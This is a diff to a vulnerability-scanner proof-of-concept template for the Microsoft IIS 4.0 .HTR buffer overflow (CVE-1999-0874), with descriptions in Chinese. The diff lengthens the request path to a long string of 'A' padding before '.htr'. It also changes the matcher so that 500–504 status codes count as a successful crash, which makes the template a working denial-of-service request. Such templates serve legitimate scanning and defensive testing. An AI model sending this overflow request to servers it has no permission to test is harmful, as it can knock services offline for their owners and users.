@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证Microsoft IIS 4.0处理超长.htr文件请求时的缓冲区溢出漏洞。攻击者发送包含填充数据的GET请求至.htr文件，触发堆栈缓冲区溢出，可导致拒绝服务或远程代码执行。参考ExploitDB 19248。"
+description = "Microsoft IIS 4.0 在处理 .HTR 扩展名的请求时存在远程缓冲区溢出漏洞（CVE-1999-0874）。攻击者可通过发送超长的畸形 .HTR 请求触发缓冲区溢出，导致服务崩溃。本 PoC 通过构造超长 URL 发送请求并检测服务器是否失去响应（拒绝服务）来验证漏洞存在。"
 id = "POC-AVE-1999-1009"
-name = "Microsoft IIS 4.0 .HTR Buffer Overflow PoC"
+name = "CVE-1999-0874 Microsoft IIS 4.0 远程缓冲区溢出 PoC"
 severity = "critical"
 tags = ["ave-1999-1009"]
 vuln_id = [
@@ -11,23 +11,22 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/AAAAAABBBB.htr"
+path = "/{{BaseURL}}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.htr"
 protocol = "http"
 
 [poc.requests.headers]
-Host = "{{Hostname}}"
 User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "Server: Microsoft-IIS/4.0",
-    "500",
-    "401.2",
+status = [
+    500,
+    502,
+    503,
+    504,
 ]
+type = "status"
